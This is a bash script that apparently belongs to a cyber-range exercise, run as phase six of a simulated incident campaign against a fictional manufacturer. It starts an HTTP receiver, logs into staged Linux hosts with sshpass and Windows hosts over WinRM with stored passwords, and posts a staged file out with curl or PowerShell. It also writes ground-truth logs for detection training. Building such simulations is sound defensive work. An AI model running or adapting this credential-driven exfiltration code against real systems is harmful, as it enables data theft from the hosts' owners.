#!/usr/bin/env bash

set -u


# ============================================================
# Nordic Manufacturing A/S
# H3 Incident Campaign V2
#
# Phase 06 - Exfiltration Simulation
#
# Linux:
#   SSH -> curl -> IncidentVM
#
# Windows:
#   WinRM -> PowerShell HTTP POST -> IncidentVM
#
# Only the exact synthetic staging file created during
# Phase 05 is transferred.
# ============================================================


# ============================================================
# PATHS / CONFIG
# ============================================================

BASE_DIR="/opt/nordic-attack"
CONFIG_FILE="$BASE_DIR/config/defaults.conf"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[ERROR] Configuration file not found: $CONFIG_FILE"
    exit 1
fi

# shellcheck source=/dev/null
source "$CONFIG_FILE"

mkdir -p \
    "$NORDIC_LOG_DIR" \
    "$NORDIC_STATE_DIR" \
    "$NORDIC_UPLOAD_DIR"


# ============================================================
# CAMPAIGN CONFIGURATION
# ============================================================

INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-$(date +%Y%m%d-%H%M%S)}"

SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-$NORDIC_DEFAULT_SSH_PASSWORD}"

RDP_PASSWORD="${NORDIC_RDP_PASSWORD:-$NORDIC_DEFAULT_RDP_PASSWORD}"

WINRM_HTTP_PORT="${NORDIC_WINRM_HTTP_PORT:-${NORDIC_DEFAULT_WINRM_HTTP_PORT:-5985}}"
WINRM_HTTPS_PORT="${NORDIC_WINRM_HTTPS_PORT:-${NORDIC_DEFAULT_WINRM_HTTPS_PORT:-5986}}"

STAGING_STATE="$NORDIC_STATE_DIR/staged-data.json"
EXFIL_STATE="$NORDIC_STATE_DIR/exfiltration.json"

LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-06-exfil.log"

EXFIL_PORT="${NORDIC_EXFIL_PORT:-9090}"


# ============================================================
# FUNCTIONS
# ============================================================

log() {

    local MESSAGE="$1"

    echo "$MESSAGE"

    printf '%s %s\n' \
        "$(date --iso-8601=seconds)" \
        "$MESSAGE" \
        >> "$LOG_FILE"
}


ground_truth() {

    local MESSAGE="$1"

    printf '%s INCIDENT=%s PHASE=06 %s\n' \
        "$(date --iso-8601=seconds)" \
        "$INCIDENT_ID" \
        "$MESSAGE" \
        >> "$NORDIC_GROUND_TRUTH_LOG"
}


tcp_open() {
    local HOST="$1"
    local PORT="$2"
    local CONNECT_TIMEOUT="${NORDIC_CONNECT_TIMEOUT:-2}"

    timeout "$CONNECT_TIMEOUT" \
        bash -c "echo >/dev/tcp/$HOST/$PORT" \
        >/dev/null 2>&1
}


# ============================================================
# REQUIRED COMMANDS
# ============================================================

for CMD in python3 sshpass ssh timeout; do

    if ! command -v "$CMD" >/dev/null 2>&1; then

        echo "[ERROR] Required command not found: $CMD"
        exit 1

    fi

done


# ============================================================
# WINDOWS WINRM SUPPORT
# ============================================================

PYWINRM_AVAILABLE=0

if python3 -c "import winrm" >/dev/null 2>&1; then
    PYWINRM_AVAILABLE=1
fi


# ============================================================
# VALIDATION
# ============================================================

if [[ ! -f "$STAGING_STATE" ]]; then

    echo "[ERROR] Missing staging inventory:"
    echo "$STAGING_STATE"
    echo
    echo "Run Phase 05 first."

    exit 1
fi


if ! [[ "$EXFIL_PORT" =~ ^[0-9]+$ ]] ||
   (( EXFIL_PORT < 1024 || EXFIL_PORT > 65535 )); then

    echo "[ERROR] Invalid exfiltration port:"
    echo "$EXFIL_PORT"

    exit 1
fi


# ============================================================
# DETERMINE INCIDENTVM IP
# ============================================================

FIRST_TARGET="$(
    python3 - "$STAGING_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)

hosts = data.get("hosts", [])

if hosts:
    print(hosts[0].get("ip", ""))
PY
)"


INCIDENT_IP="${NORDIC_INCIDENT_IP:-}"


if [[ -z "$INCIDENT_IP" ]] && [[ -n "$FIRST_TARGET" ]]; then

    INCIDENT_IP="$(
        ip -4 route get "$FIRST_TARGET" 2>/dev/null |
        awk '
        {
            for (i=1; i<=NF; i++) {
                if ($i == "src") {
                    print $(i+1)
                    exit
                }
            }
        }'
    )"

fi


if [[ -z "$INCIDENT_IP" ]]; then

    echo "[ERROR] Unable to determine IncidentVM IP."
    echo
    echo "Supply NORDIC_INCIDENT_IP through the campaign GUI."

    exit 1
fi


# ============================================================
# LOAD STAGED HOSTS
#
# Format:
#
# IP|PLATFORM|ACCESS|PORT|USER|FILE|SIZE|HASH
#
# Old Linux-only staged-data.json is also supported.
# ============================================================

mapfile -t STAGED_HOSTS < <(

    python3 - "$STAGING_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)


for host in data.get("hosts", []):

    if not host.get("staged"):
        continue

    ip = host.get("ip", "")

    if not ip:
        continue


    platform = host.get(
        "platform",
        ""
    ).lower()

    access = host.get(
        "access",
        ""
    ).lower()


    # --------------------------------------------------------
    # Backwards compatibility
    # --------------------------------------------------------

    if not platform:
        platform = "linux"


    if platform == "linux":

        port = host.get(
            "ssh_port",
            22
        )

        user = (
            host.get("ssh_username")
            or host.get("ssh_user")
            or "ubuntu"
        )

        access = "ssh"


    elif platform == "windows":

        port = host.get(
            "winrm_port",
            5985
        )

        user = (
            host.get("rdp_username")
            or host.get("rdp_user")
            or "Administrator"
        )

        access = "winrm"


    else:
        continue


    print(
        "{}|{}|{}|{}|{}|{}|{}|{}".format(
            ip,
            platform,
            access,
            port,
            user,
            host.get("file", ""),
            host.get("size", 0),
            host.get("sha256", ""),
        )
    )

PY

)


# ============================================================
# BANNER
# ============================================================

echo
echo "============================================================"
echo " NORDIC MANUFACTURING"
echo " H3 INCIDENT CAMPAIGN V2"
echo " PHASE 06 - EXFILTRATION"
echo "============================================================"
echo

log "[*] Incident ID: $INCIDENT_ID"
log "[*] IncidentVM receiver: $INCIDENT_IP:$EXFIL_PORT"
log "[*] Staged hosts: ${#STAGED_HOSTS[@]}"

echo


# ============================================================
# NO STAGED HOSTS
# ============================================================

if [[ ${#STAGED_HOSTS[@]} -eq 0 ]]; then

    log "[*] No staged hosts available."

    python3 - "$EXFIL_STATE" "$INCIDENT_ID" <<'PY'
import json
import sys
from datetime import datetime, timezone

data = {
    "incident_id": sys.argv[2],
    "generated": datetime.now(
        timezone.utc
    ).isoformat(),
    "count": 0,
    "transfers": [],
}

with open(
    sys.argv[1],
    "w",
    encoding="utf-8"
) as f:

    json.dump(
        data,
        f,
        indent=2
    )
PY

    ground_truth \
        "PHASE_COMPLETE transfers=0"

    exit 0
fi


# ============================================================
# CREATE TEMPORARY RECEIVER
# ============================================================

RECEIVER="$NORDIC_STATE_DIR/.exfil-receiver.py"


cat > "$RECEIVER" <<'PY'
import os
import sys

from http.server import (
    BaseHTTPRequestHandler,
    HTTPServer,
)


bind_ip = sys.argv[1]
port = int(sys.argv[2])
upload_dir = sys.argv[3]


os.makedirs(
    upload_dir,
    exist_ok=True
)


class Handler(BaseHTTPRequestHandler):

    def do_POST(self):

        length = int(
            self.headers.get(
                "Content-Length",
                "0"
            )
        )

        source = self.headers.get(
            "X-Nordic-Source",
            "unknown"
        )

        incident = self.headers.get(
            "X-Nordic-Incident",
            "unknown"
        )

        platform = self.headers.get(
            "X-Nordic-Platform",
            "unknown"
        )


        safe_source = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in source
        )

        safe_incident = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in incident
        )

        safe_platform = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in platform
        )


        filename = (
            f"{safe_incident}-"
            f"{safe_platform}-"
            f"{safe_source}.bin"
        )


        destination = os.path.join(
            upload_dir,
            filename
        )


        remaining = length


        with open(
            destination,
            "wb"
        ) as f:

            while remaining > 0:

                chunk = self.rfile.read(
                    min(
                        65536,
                        remaining
                    )
                )

                if not chunk:
                    break

                f.write(
                    chunk
                )

                remaining -= len(
                    chunk
                )


        received = (
            length - remaining
        )


        self.send_response(
            200
        )

        self.end_headers()


        self.wfile.write(
            (
                f"NORDIC_RECEIVED "
                f"{received}\n"
            ).encode()
        )


    def log_message(
        self,
        fmt,
        *args
    ):

        sys.stdout.write(
            "%s %s\n" %
            (
                self.address_string(),
                fmt % args
            )
        )

        sys.stdout.flush()


server = HTTPServer(
    (
        bind_ip,
        port
    ),
    Handler
)

server.serve_forever()

PY


# ============================================================
# START RECEIVER
# ============================================================

RECEIVER_LOG="$NORDIC_LOG_DIR/${INCIDENT_ID}-exfil-receiver.log"


python3 "$RECEIVER" \
    "$INCIDENT_IP" \
    "$EXFIL_PORT" \
    "$NORDIC_UPLOAD_DIR" \
    >> "$RECEIVER_LOG" 2>&1 &


RECEIVER_PID=$!


cleanup() {

    if kill -0 "$RECEIVER_PID" 2>/dev/null; then

        kill "$RECEIVER_PID" 2>/dev/null || true

        wait "$RECEIVER_PID" 2>/dev/null || true

    fi

    rm -f "$RECEIVER"
}


trap cleanup EXIT


sleep 1


if ! kill -0 "$RECEIVER_PID" 2>/dev/null; then

    echo "[ERROR] Exfiltration receiver failed to start."
    echo
    echo "Receiver log:"
    echo "$RECEIVER_LOG"

    exit 1
fi


log "[+] Exfiltration receiver started."


# ============================================================
# EXFILTRATION
# ============================================================

TMP_RESULTS="$NORDIC_STATE_DIR/.exfil.tmp"

: > "$TMP_RESULTS"

SUCCESS_COUNT=0
FAILED_COUNT=0
SKIPPED_COUNT=0

LINUX_SUCCESS=0
WINDOWS_SUCCESS=0


for RECORD in "${STAGED_HOSTS[@]}"; do

    IFS='|' read -r \
        HOST \
        PLATFORM \
        ACCESS \
        ACCESS_PORT \
        ACCESS_USER \
        REMOTE_FILE \
        EXPECTED_SIZE \
        EXPECTED_HASH \
        <<< "$RECORD"


    echo
    echo "------------------------------------------------------------"
    echo " Source host: $HOST"
    echo " Platform:    $PLATFORM"
    echo "------------------------------------------------------------"
    echo


    log "[*] Starting simulated exfiltration from $HOST ($PLATFORM)"


    ground_truth \
        "EXFIL_START source=$HOST platform=$PLATFORM destination=$INCIDENT_IP:$EXFIL_PORT file=$REMOTE_FILE"


    # ========================================================
    # LINUX
    # ========================================================

    if [[ "$PLATFORM" == "linux" ]]; then


        if [[ -z "$SSH_PASSWORD" ]]; then

            FAILED_COUNT=$(( FAILED_COUNT + 1 ))

            log "[WARNING] SSH password unavailable for $HOST"

            ground_truth \
                "EXFIL_FAILED source=$HOST platform=linux reason=missing_credentials"

            continue
        fi


        REMOTE_RESULT="$(
            sshpass -p "$SSH_PASSWORD" \
                ssh \
                    -p "$ACCESS_PORT" \
                    -o StrictHostKeyChecking=no \
                    -o UserKnownHostsFile=/dev/null \
                    -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
                    -o PreferredAuthentications=password \
                    -o PubkeyAuthentication=no \
                    -o NumberOfPasswordPrompts=1 \
                    "$ACCESS_USER@$HOST" \
                    bash -s -- \
                        "$REMOTE_FILE" \
                        "$INCIDENT_IP" \
                        "$EXFIL_PORT" \
                        "$HOST" \
                        "$INCIDENT_ID" <<'REMOTE'

REMOTE_FILE="$1"
INCIDENT_IP="$2"
EXFIL_PORT="$3"
SOURCE_HOST="$4"
INCIDENT_ID="$5"


if [[ ! -f "$REMOTE_FILE" ]]; then

    echo "NORDIC_EXFIL_ERROR file-not-found"
    exit 1

fi


if ! command -v curl >/dev/null 2>&1; then

    echo "NORDIC_EXFIL_ERROR curl-not-found"
    exit 1

fi


RESPONSE="$(
    curl \
        -sS \
        --connect-timeout 5 \
        --max-time 30 \
        -X POST \
        -H "Content-Type: application/octet-stream" \
        -H "X-Nordic-Source: $SOURCE_HOST" \
        -H "X-Nordic-Incident: $INCIDENT_ID" \
        -H "X-Nordic-Platform: linux" \
        --data-binary "@$REMOTE_FILE" \
        "http://${INCIDENT_IP}:${EXFIL_PORT}/upload"
)"


RESULT=$?


if [[ $RESULT -ne 0 ]]; then

    echo "NORDIC_EXFIL_ERROR curl-failed"
    exit 1

fi


echo "$RESPONSE"

REMOTE
        )"


        COMMAND_RESULT=$?


        if [[ $COMMAND_RESULT -eq 0 ]] &&
           grep -q '^NORDIC_RECEIVED ' <<< "$REMOTE_RESULT"; then


            RECEIVED_SIZE="$(
                printf '%s\n' "$REMOTE_RESULT" |
                awk '/^NORDIC_RECEIVED / {print $2}' |
                tail -n 1
            )"


            SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))
            LINUX_SUCCESS=$(( LINUX_SUCCESS + 1 ))


            log "[+] Exfiltration completed from $HOST"
            log "    Platform: Linux"
            log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
            log "    Bytes: $RECEIVED_SIZE"


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "linux" \
                "$REMOTE_FILE" \
                "$INCIDENT_IP" \
                "$EXFIL_PORT" \
                "$RECEIVED_SIZE" \
                "$EXPECTED_HASH" \
                >> "$TMP_RESULTS"


            ground_truth \
                "EXFIL_SUCCESS source=$HOST platform=linux destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE"


        else

            FAILED_COUNT=$(( FAILED_COUNT + 1 ))

            log "[WARNING] Exfiltration failed from Linux host $HOST"

            ground_truth \
                "EXFIL_FAILED source=$HOST platform=linux destination=$INCIDENT_IP:$EXFIL_PORT"

        fi


    # ========================================================
    # WINDOWS
    # ========================================================

    elif [[ "$PLATFORM" == "windows" ]]; then


        if [[ -z "$RDP_PASSWORD" ]]; then

            FAILED_COUNT=$(( FAILED_COUNT + 1 ))

            log "[WARNING] Windows password unavailable for $HOST"

            ground_truth \
                "EXFIL_FAILED source=$HOST platform=windows reason=missing_credentials"

            continue
        fi


        if [[ $PYWINRM_AVAILABLE -ne 1 ]]; then

            SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))

            log "[SKIPPED] Python pywinrm is not installed."

            ground_truth \
                "EXFIL_SKIPPED source=$HOST platform=windows reason=pywinrm_unavailable"

            continue
        fi


        # ----------------------------------------------------
        # Use the WinRM port saved by Phase 05 when possible.
        # Verify it is still reachable.
        # ----------------------------------------------------

        WINRM_PORT=""
        WINRM_SCHEME=""


        if [[ "$ACCESS_PORT" == "$WINRM_HTTPS_PORT" ]] &&
           tcp_open "$HOST" "$ACCESS_PORT"; then

            WINRM_PORT="$ACCESS_PORT"
            WINRM_SCHEME="https"


        elif [[ "$ACCESS_PORT" == "$WINRM_HTTP_PORT" ]] &&
             tcp_open "$HOST" "$ACCESS_PORT"; then

            WINRM_PORT="$ACCESS_PORT"
            WINRM_SCHEME="http"


        elif tcp_open "$HOST" "$WINRM_HTTP_PORT"; then

            WINRM_PORT="$WINRM_HTTP_PORT"
            WINRM_SCHEME="http"


        elif tcp_open "$HOST" "$WINRM_HTTPS_PORT"; then

            WINRM_PORT="$WINRM_HTTPS_PORT"
            WINRM_SCHEME="https"


        else

            SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))

            log "[SKIPPED] No reachable WinRM service on $HOST"

            ground_truth \
                "EXFIL_SKIPPED source=$HOST platform=windows reason=winrm_unavailable"

            continue
        fi


        # ----------------------------------------------------
        # Execute the POST FROM the Windows host.
        #
        # PowerShell reads only REMOTE_FILE, which is the
        # synthetic file recorded by Phase 05.
        # ----------------------------------------------------

        WINDOWS_RESULT="$(
            NORDIC_WINRM_PASSWORD="$RDP_PASSWORD" \
            python3 - \
                "$HOST" \
                "$WINRM_PORT" \
                "$WINRM_SCHEME" \
                "$ACCESS_USER" \
                "$REMOTE_FILE" \
                "$INCIDENT_IP" \
                "$EXFIL_PORT" \
                "$INCIDENT_ID" <<'PY'

import os
import sys

import winrm


host = sys.argv[1]
port = int(sys.argv[2])
scheme = sys.argv[3]
username = sys.argv[4]
remote_file = sys.argv[5]
incident_ip = sys.argv[6]
exfil_port = int(sys.argv[7])
incident_id = sys.argv[8]

password = os.environ[
    "NORDIC_WINRM_PASSWORD"
]


endpoint = (
    f"{scheme}://"
    f"{host}:"
    f"{port}/wsman"
)


session = winrm.Session(
    endpoint,
    auth=(
        username,
        password
    ),
    transport="ntlm",
    server_cert_validation="ignore",
)


def ps_quote(value):
    return value.replace(
        "'",
        "''"
    )


remote_file_ps = ps_quote(
    remote_file
)

incident_ip_ps = ps_quote(
    incident_ip
)

incident_id_ps = ps_quote(
    incident_id
)

host_ps = ps_quote(
    host
)


powershell = rf'''
$ErrorActionPreference = "Stop"

$RemoteFile = '{remote_file_ps}'
$IncidentIP = '{incident_ip_ps}'
$ExfilPort = {exfil_port}
$SourceHost = '{host_ps}'
$IncidentId = '{incident_id_ps}'


if (-not (
    Test-Path `
        -LiteralPath $RemoteFile `
        -PathType Leaf
)) {{

    Write-Output "NORDIC_EXFIL_ERROR file-not-found"
    exit 1

}}


$Uri = (
    "http://" +
    $IncidentIP +
    ":" +
    $ExfilPort +
    "/upload"
)


$Headers = @{{
    "X-Nordic-Source" = $SourceHost
    "X-Nordic-Incident" = $IncidentId
    "X-Nordic-Platform" = "windows"
}}


try {{

    $Bytes = [System.IO.File]::ReadAllBytes(
        $RemoteFile
    )


    $Response = Invoke-WebRequest `
        -Uri $Uri `
        -Method Post `
        -Headers $Headers `
        -ContentType "application/octet-stream" `
        -Body $Bytes `
        -UseBasicParsing `
        -TimeoutSec 30


    Write-Output (
        $Response.Content.Trim()
    )

}}
catch {{

    Write-Output "NORDIC_EXFIL_ERROR http-post-failed"
    Write-Error $_
    exit 1

}}
'''


result = session.run_ps(
    powershell
)


stdout = result.std_out.decode(
    "utf-8",
    errors="replace"
)

stderr = result.std_err.decode(
    "utf-8",
    errors="replace"
)


if stdout:
    print(
        stdout,
        end=""
    )


if stderr:
    print(
        stderr,
        file=sys.stderr,
        end=""
    )


sys.exit(
    0 if result.status_code == 0 else 1
)

PY
        )"


        COMMAND_RESULT=$?


        if [[ $COMMAND_RESULT -eq 0 ]] &&
           grep -q '^NORDIC_RECEIVED ' <<< "$WINDOWS_RESULT"; then


            RECEIVED_SIZE="$(
                printf '%s\n' "$WINDOWS_RESULT" |
                awk '/^NORDIC_RECEIVED / {print $2}' |
                tail -n 1
            )"


            SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))
            WINDOWS_SUCCESS=$(( WINDOWS_SUCCESS + 1 ))


            log "[+] Exfiltration completed from $HOST"
            log "    Platform: Windows"
            log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
            log "    Bytes: $RECEIVED_SIZE"


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "windows" \
                "$REMOTE_FILE" \
                "$INCIDENT_IP" \
                "$EXFIL_PORT" \
                "$RECEIVED_SIZE" \
                "$EXPECTED_HASH" \
                >> "$TMP_RESULTS"


            ground_truth \
                "EXFIL_SUCCESS source=$HOST platform=windows destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE"


        else

            FAILED_COUNT=$(( FAILED_COUNT + 1 ))

            log "[WARNING] Exfiltration failed from Windows host $HOST"

            ground_truth \
                "EXFIL_FAILED source=$HOST platform=windows destination=$INCIDENT_IP:$EXFIL_PORT"

        fi


    # ========================================================
    # UNKNOWN PLATFORM
    # ========================================================

    else

        SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))

        log "[SKIPPED] Unknown platform for $HOST: $PLATFORM"

        ground_truth \
            "EXFIL_SKIPPED source=$HOST reason=unknown_platform"

    fi

done


# ============================================================
# CREATE exfiltration.json
# ============================================================

python3 - \
    "$TMP_RESULTS" \
    "$EXFIL_STATE" \
    "$INCIDENT_ID" <<'PY'

import json
import sys
from datetime import datetime, timezone


source_file = sys.argv[1]
output_file = sys.argv[2]
incident_id = sys.argv[3]

transfers = []


with open(
    source_file,
    encoding="utf-8"
) as f:

    for line in f:

        line = line.rstrip("\n")

        if not line:
            continue


        (
            source,
            platform,
            remote_file,
            destination,
            port,
            size,
            sha256,
        ) = line.split("|", 6)


        transfers.append(
            {
                "source": source,
                "platform": platform,
                "remote_file": remote_file,
                "destination": destination,
                "port": int(port),
                "bytes": int(size),
                "sha256": sha256,
                "successful": True,
            }
        )


data = {
    "incident_id": incident_id,
    "generated": datetime.now(
        timezone.utc
    ).isoformat(),
    "count": len(transfers),
    "transfers": transfers,
}


with open(
    output_file,
    "w",
    encoding="utf-8"
) as f:

    json.dump(
        data,
        f,
        indent=2
    )

PY


rm -f "$TMP_RESULTS"


# ============================================================
# STOP RECEIVER
# ============================================================

cleanup

trap - EXIT


# ============================================================
# SUMMARY
# ============================================================

echo
echo "============================================================"
echo " PHASE 06 COMPLETED"
echo "============================================================"
echo

echo "IncidentVM receiver:"
echo "  http://$INCIDENT_IP:$EXFIL_PORT"

echo

echo "Staged hosts:"
echo "  ${#STAGED_HOSTS[@]}"

echo

echo "Successful transfers:"
echo "  $SUCCESS_COUNT"

echo

echo "Linux transfers:"
echo "  $LINUX_SUCCESS"

echo

echo "Windows transfers:"
echo "  $WINDOWS_SUCCESS"

echo

echo "Failed transfers:"
echo "  $FAILED_COUNT"

echo

echo "Skipped transfers:"
echo "  $SKIPPED_COUNT"

echo

echo "Received files:"
echo "  $NORDIC_UPLOAD_DIR"

echo

echo "Exfiltration state:"
echo "  $EXFIL_STATE"

echo

echo "Log:"
echo "  $LOG_FILE"

echo


ground_truth \
    "PHASE_COMPLETE transfers=$SUCCESS_COUNT linux_transfers=$LINUX_SUCCESS windows_transfers=$WINDOWS_SUCCESS failed=$FAILED_COUNT skipped=$SKIPPED_COUNT"


exit 0